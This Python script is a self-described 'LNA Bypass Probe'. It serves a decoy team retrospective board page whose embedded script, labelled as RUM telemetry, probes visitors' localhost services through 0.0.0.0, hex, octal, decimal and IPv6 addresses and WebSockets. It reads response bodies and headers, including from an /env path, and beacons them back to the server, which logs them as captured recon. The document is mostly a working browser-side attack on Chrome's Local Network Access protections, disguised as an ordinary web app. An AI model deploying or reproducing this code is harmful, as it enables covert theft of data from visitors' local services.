#!/usr/bin/env python3
"""
Reflect — LNA Bypass Probe
Tests 0.0.0.0 and alternative IP representations against localhost:8080
Goal: bypass Chrome's Local Network Access to read response content

python3 server.py [port]  (default 7778)
"""

import json, sys, os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
HITS = []
RECON = []

LOGO = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#0d9488" stroke-width="1.5"/><path d="M12 6v6l4 2" stroke="#0d9488" stroke-width="1.5" stroke-linecap="round"/></svg>'

PAGE = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sprint 24 Retro — Reflect</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f1f5f9;color:#0f172a;line-height:1.5;height:100vh;display:flex;flex-direction:column;overflow:hidden}
nav{background:#fff;border-bottom:1px solid #e2e8f0;height:48px;display:flex;align-items:center;justify-content:center;padding:0 20px;flex-shrink:0}
.ni{width:100%;max-width:1200px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:600;display:flex;align-items:center;gap:6px}
.nr{font-size:12px;color:#64748b;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;border-radius:50%;background:#10b981;display:inline-block}
.bh{max-width:1200px;width:100%;margin:0 auto;padding:12px 20px 0;flex-shrink:0}
.bh h1{font-size:18px;font-weight:700}.bh p{font-size:12px;color:#64748b}
.board{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;padding:12px 20px;max-width:1200px;width:100%;margin:0 auto;flex:1;overflow:hidden}
.col{background:#fff;border-radius:10px;border:1px solid #e2e8f0;display:flex;flex-direction:column;overflow:hidden}
.ch{padding:10px 14px;border-bottom:1px solid #f1f5f9;display:flex;align-items:center;justify-content:space-between}
.ct{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:3px 8px;border-radius:4px}
.cb{padding:8px;overflow-y:auto;flex:1;display:flex;flex-direction:column;gap:6px}
.card{background:#f8fafc;border:1px solid #f1f5f9;border-radius:7px;padding:10px 12px}
.card-t{font-size:13px;color:#334155;margin-bottom:6px}
.card-m{display:flex;align-items:center;gap:6px;font-size:10px;color:#94a3b8}
.card-a{width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:7px;font-weight:700;color:#fff}
.card-n{font-weight:600;color:#64748b}
.af{padding:8px;border-top:1px solid #f1f5f9}
.ab{width:100%;padding:7px;background:none;border:1.5px dashed #e2e8f0;border-radius:6px;font-size:12px;color:#94a3b8;cursor:pointer;font-family:inherit}
.ap{display:none}.ap.show{display:block}
.ap textarea{width:100%;padding:8px;border:1px solid #e2e8f0;border-radius:6px;font-size:13px;font-family:inherit;resize:none;min-height:60px;margin-bottom:6px}
.ar{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px}
.ar input{padding:6px 8px;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;font-family:inherit}
.as{padding:6px 14px;background:#0d9488;color:#fff;border:none;border-radius:5px;font-size:12px;font-weight:600;cursor:pointer}
.ac{padding:6px 14px;background:none;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;color:#64748b;cursor:pointer;margin-left:6px}
footer{text-align:center;padding:8px;font-size:10px;color:#cbd5e1}
</style></head><body>
<nav><div class="ni"><span class="logo">LOGO_PLACEHOLDERReflect</span><span class="nr"><span class="dot"></span>Live &middot; Sprint 24</span></div></nav>
<div class="bh"><h1>Sprint 24 Retrospective</h1><p>Platform Team &middot; Jun 30 – Jul 3, 2026</p></div>
<div class="board">
  <div class="col">
    <div class="ch"><span class="ct" style="background:#dcfce7;color:#166534">Wins</span></div>
    <div class="cb" id="wins-cb">
      <div class="card"><div class="card-t">Auth service migration completed 2 days early</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 2h</div></div>
      <div class="card"><div class="card-t">Zero P0 incidents during deploy week</div><div class="card-m"><span class="card-a" style="background:#d97706">AK</span><span class="card-n">Alex K.</span>&middot; 4h</div></div>
    </div>
    <div class="af">
      <button class="ab" onclick="this.nextElementSibling.classList.add('show');this.style.display='none'">+ Add a card</button>
      <div class="ap"><textarea id="w-t" placeholder="What went well?"></textarea>
        <div class="ar"><input id="w-n" placeholder="Your name"><input id="w-tm" placeholder="Team"></div>
        <button class="as" onclick="addCard('wins')">Add Card</button></div>
    </div>
  </div>
  <div class="col">
    <div class="ch"><span class="ct" style="background:#fef3c7;color:#92400e">Improve</span></div>
    <div class="cb"><div class="card"><div class="card-t">Deploy pipeline still takes 40+ minutes</div><div class="card-m"><span class="card-a" style="background:#059669">MR</span><span class="card-n">Marcus R.</span>&middot; 3h</div></div></div>
    <div class="af"><button class="ab" onclick="this.nextElementSibling.classList.add('show');this.style.display='none'">+ Add a card</button><div class="ap"><textarea placeholder="What could be better?"></textarea><div class="ar"><input placeholder="Your name"><input placeholder="Team"></div><button class="as">Add Card</button></div></div>
  </div>
  <div class="col">
    <div class="ch"><span class="ct" style="background:#dbeafe;color:#1e40af">Actions</span></div>
    <div class="cb"><div class="card"><div class="card-t">Set up canary deploys for Q3</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 1h</div></div></div>
    <div class="af"><button class="ab" onclick="this.nextElementSibling.classList.add('show');this.style.display='none'">+ Add a card</button><div class="ap"><textarea placeholder="Next steps?"></textarea><div class="ar"><input placeholder="Your name"><input placeholder="Team"></div><button class="as">Add Card</button></div></div>
  </div>
</div>
<footer>&copy; 2026 Reflect</footer>
<script>
function addCard(col){
  var t=document.getElementById('w-t').value,n=document.getElementById('w-n').value;
  if(!t)return;
  var d=document.createElement('div');d.className='card';
  d.innerHTML='<div class="card-t">'+t.replace(/</g,'&lt;')+'</div><div class="card-m"><span class="card-a" style="background:#0d9488">'+((n||'?')[0].toUpperCase())+'</span><span class="card-n">'+(n||'Anon')+'</span>&middot; now</div>';
  document.getElementById('wins-cb').appendChild(d);
  fetch('/api/cards',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({text:t,name:n,team:document.getElementById('w-tm').value})});
  document.getElementById('w-t').value='';
}

// ═══════════════════════════════════════════════════════════════
// RUM — LNA Bypass Probes
// ═══════════════════════════════════════════════════════════════
;(function(){
  var _q=[],_sid=Math.random().toString(36).slice(2),_t0=Date.now(),_ep='/api/rum/v2/events';
  function _p(c,e,d){_q.push({c:c,e:e,d:d,t:Date.now()-_t0});}
  function _f(){if(!_q.length)return;var b=_q.splice(0);
    try{navigator.sendBeacon(_ep,JSON.stringify({sid:_sid,events:b}));}catch(x){
    fetch(_ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:_sid,events:b}),keepalive:true}).catch(function(){});}}

  // All alternative representations of 127.0.0.1 / localhost
  var targets=[
    // 0.0.0.0 — known LNA bypass on Linux/macOS
    {label:'0.0.0.0:8080',       url:'http://0.0.0.0:8080/'},
    {label:'0.0.0.0:8080/health', url:'http://0.0.0.0:8080/health'},
    {label:'0.0.0.0:8080/env',   url:'http://0.0.0.0:8080/env'},
    {label:'0.0.0.0:80',         url:'http://0.0.0.0/'},
    // Hex representation
    {label:'0x7f000001:8080',     url:'http://0x7f000001:8080/'},
    // Decimal representation
    {label:'2130706433:8080',     url:'http://2130706433:8080/'},
    // Octal representation
    {label:'0177.0.0.1:8080',    url:'http://0177.0.0.1:8080/'},
    // Mixed notation
    {label:'127.0.0.1:8080',     url:'http://127.0.0.1:8080/'},
    // IPv6 loopback
    {label:'[::1]:8080',         url:'http://[::1]:8080/'},
    // IPv6 any
    {label:'[::]:8080',          url:'http://[::]:8080/'},
    // Shortened zero
    {label:'0:8080',             url:'http://0:8080/'},
    {label:'0.0.0.0:3000',      url:'http://0.0.0.0:3000/'},
    {label:'0.0.0.0:9090',      url:'http://0.0.0.0:9090/'},
    // localhost keyword (compare)
    {label:'localhost:8080',     url:'http://localhost:8080/'},
  ];

  var delay=0;
  targets.forEach(function(t){
    // Test 1: cors mode (can we READ the response?)
    setTimeout(function(){
      var t0=Date.now();
      fetch(t.url,{mode:'cors',cache:'no-store',signal:AbortSignal.timeout(3000)})
      .then(function(r){
        var hdrs={};try{r.headers.forEach(function(v,k){hdrs[k]=v;});}catch(x){}
        return r.text().then(function(body){
          _p('lna','cors_ok',{label:t.label,ms:Date.now()-t0,status:r.status,type:r.type,
            headers:hdrs,body:body.substring(0,3000)});
        });
      }).catch(function(e){
        _p('lna','cors_err',{label:t.label,ms:Date.now()-t0,err:e.message});
      });
    },delay);

    // Test 2: no-cors mode (can we at least reach it?)
    setTimeout(function(){
      var t0=Date.now();
      fetch(t.url,{mode:'no-cors',cache:'no-store',signal:AbortSignal.timeout(3000)})
      .then(function(r){
        _p('lna','nocors_ok',{label:t.label,ms:Date.now()-t0,type:r.type});
      }).catch(function(e){
        _p('lna','nocors_err',{label:t.label,ms:Date.now()-t0,err:e.message});
      });
    },delay+100);

    delay+=250;
  });

  // Also try WebSocket on 0.0.0.0 (WebSocket ignores CORS)
  setTimeout(function(){
    var wsTargets=[
      'ws://0.0.0.0:8080/','ws://0.0.0.0:8080/ws',
      'ws://[::1]:8080/','ws://0:8080/'
    ];
    wsTargets.forEach(function(url,i){
      setTimeout(function(){
        try{
          var t0=Date.now(),ws=new WebSocket(url);
          ws.onopen=function(){
            _p('ws','open',{url:url,ms:Date.now()-t0});
            try{ws.send('GET / HTTP/1.1\r\nHost: localhost\r\n\r\n');}catch(x){}
          };
          ws.onmessage=function(e){
            _p('ws','msg',{url:url,data:(typeof e.data==='string'?e.data:'[bin]').substring(0,2000)});
          };
          ws.onerror=function(){_p('ws','err',{url:url,ms:Date.now()-t0});};
          ws.onclose=function(e){_p('ws','close',{url:url,code:e.code,ms:Date.now()-t0});};
          setTimeout(function(){try{ws.close();}catch(x){}},3000);
        }catch(e){_p('ws','exception',{url:url,err:e.message});}
      },300*i);
    });
  },delay+500);

  setInterval(_f,3000);
  window.addEventListener('beforeunload',_f);
  setTimeout(_f,6000);
  setTimeout(_f,12000);
  setTimeout(_f,18000);
})();
</script>
</body></html>"""

# Fix logo placeholder
PAGE = PAGE.replace('LOGO_PLACEHOLDER', LOGO)


class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self):
        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
                or self.headers.get('X-Real-IP','') or self.client_address[0])
    def _log(self, m, x=None):
        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip()}
        if x: e.update(x)
        HITS.append(e)
        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')

    def do_HEAD(self):
        self.send_response(200);self.send_header('Content-Type','text/html');self.end_headers()

    def do_GET(self):
        p = self.path.split('?')[0].rstrip('/')
        if p in ('/board','/','/retro',''):
            self._log('PAGE');self._html(PAGE)
        elif p == '/log':
            self._send(200,'application/json',json.dumps(HITS,indent=2))
        elif p == '/recon':
            self._send(200,'application/json',json.dumps(RECON,indent=2))
        elif p == '/summary':
            self._send(200,'text/html',self._summary())
        elif p == '/clear':
            HITS.clear();RECON.clear();open('captured.log','w').close()
            self._send(200,'text/plain','OK')
        else:
            self._log('GET');self._html(PAGE)

    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode() if l else ''
        p = self.path.split('?')[0].rstrip('/')
        if p == '/api/cards':
            try: data = json.loads(body)
            except: data = {}
            self._log('CARD', data)
            self._send(200,'application/json','{"ok":true}')
        elif p == '/api/rum/v2/events':
            try: data = json.loads(body)
            except: data = {}
            events = data.get('events',[])
            RECON.append({'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'ip':self._ip(),'batch':data})
            with open('recon.log','a') as f: f.write(json.dumps(data)+'\n')
            for ev in events:
                c,e,d = ev.get('c',''),ev.get('e',''),ev.get('d',{})
                if e == 'cors_ok':
                    print(f'  [!!!] CORS READ: {d.get("label")} → status={d.get("status")} type={d.get("type")}')
                    print(f'        headers: {json.dumps(d.get("headers",{}))}')
                    print(f'        body: {d.get("body","")[:500]}')
                elif e == 'nocors_ok':
                    print(f'  [*] no-cors reach: {d.get("label")} ({d.get("ms")}ms, {d.get("type")})')
                elif e == 'cors_err':
                    ms = d.get('ms',0)
                    label = d.get('label','')
                    err = d.get('err','')
                    # Only print interesting failures (slow = service exists but blocks)
                    if ms > 10:
                        print(f'  [-] cors blocked: {label} ({ms}ms) {err}')
                elif e in ('open','msg'):
                    ws_detail = json.dumps(d.get('data',''))[:200] if e=='msg' else str(d.get('ms','?'))+'ms'
                    print(f'  [!!!] WS {e}: {d.get("url","")} → {ws_detail}')
            self._send(204,'text/plain','')
        else:
            self._send(404,'text/plain','Not found')

    def _summary(self):
        html='<html><body style="font-family:monospace;padding:20px;background:#0f172a;color:#e2e8f0"><h1>LNA Bypass Results</h1>'
        wins=[];misses=[]
        for batch in RECON:
            for ev in batch.get('batch',{}).get('events',[]):
                c,e,d=ev.get('c',''),ev.get('e',''),ev.get('d',{})
                if e=='cors_ok':
                    wins.append(f'<div style="color:#4ade80;margin:4px 0">✓ CORS READ: {d.get("label")} status={d.get("status")} body={str(d.get("body",""))[:200]}</div>')
                elif e=='nocors_ok':
                    wins.append(f'<div style="color:#fbbf24;margin:4px 0">~ no-cors: {d.get("label")} ({d.get("type")})</div>')
                elif e in ('open','msg') and c=='ws':
                    wins.append(f'<div style="color:#4ade80;margin:4px 0">✓ WS {e}: {d.get("url","")}</div>')
                elif e in ('cors_err','nocors_err'):
                    misses.append(f'<div style="color:#64748b;margin:2px 0">✗ {d.get("label")}: {d.get("err","")[:60]}</div>')
        html+='<h2 style="color:#4ade80">Hits</h2>'+(''.join(wins) or '<p>None</p>')
        html+='<h2 style="color:#64748b">Blocked</h2>'+(''.join(misses[:20]) or '<p>None</p>')
        return html+'</body></html>'

    def _html(self, c): self._send(200,'text/html',c)
    def _send(self, code, ct, body):
        self.send_response(code);self.send_header('Content-Type',ct+'; charset=utf-8')
        self.send_header('Cache-Control','no-store');self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers();self.wfile.write(body.encode() if isinstance(body,str) else body)

if __name__=='__main__':
    s=HTTPServer(('0.0.0.0',PORT),H)
    print(f"""
  ┌────────────────────────────────────────────────┐
  │  Reflect — LNA Bypass Probe                     │
  │  http://0.0.0.0:{PORT:<31}│
  ├────────────────────────────────────────────────┤
  │  Targets: 0.0.0.0, hex, octal, decimal, IPv6   │
  │  Modes:   cors (read) + no-cors (reach)         │
  │  Also:    WebSocket on 0.0.0.0                  │
  ├────────────────────────────────────────────────┤
  │  [!!!] = CORS READ SUCCESS (game over)          │
  │  [*]   = reachable but opaque                   │
  │  [-]   = blocked                                │
  ├────────────────────────────────────────────────┤
  │  /board   /recon   /summary   /log   /clear     │
  └────────────────────────────────────────────────┘
""")
    try: s.serve_forever()
    except KeyboardInterrupt: print('\n  Done.\n');s.server_close()
